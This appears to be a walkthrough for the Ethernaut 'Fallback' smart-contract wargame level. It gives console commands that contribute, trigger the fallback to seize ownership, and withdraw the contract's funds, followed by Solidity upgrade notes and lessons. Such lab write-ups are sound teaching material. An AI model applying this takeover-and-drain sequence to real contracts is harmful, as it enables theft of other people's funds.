[1. Fallback](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008)
---

## Walkthrough

```
// 1. Contribute to contract.
await contract.contribute({value:1})

// 2. Send a tx to triggers fallback.
sendTransaction({ to: contract.address, value: 1 })

// 3. verify owner
await contract.owner()

// 4. withdraw
await contract.withdraw()

// 5. confirm the check balance
await getBalance(instance) // same as getBalance(contract.address)
```

## Contracts

- `contract/Fallback.sol` - Original version from Ethernaut website.
- `contract/FallbackV2.sol` - Updated for solidity 0.8.0
  - Remove `SafeMath`
  - Update `payable` function

## Hardhat

- [01-fallback](/scripts/01-fallback.ts)
- [01-fallback-v2](/scripts/01-fallback-v2.ts)

```
npx hardhat run scripts/01-fallback.ts
npx hardhat run scripts/01-fallback-v2-ts
```

## Lesson Learned

- You don't need `SafeMath` for solidity `v0.8.0` + has built-in the overflow/underflow check.
- `address` and `address payable` is different. converted using explicit converstion `payable(address)`
- `contructor` no need to add `public` Visibility for constructor is ignored because contructor always call only once.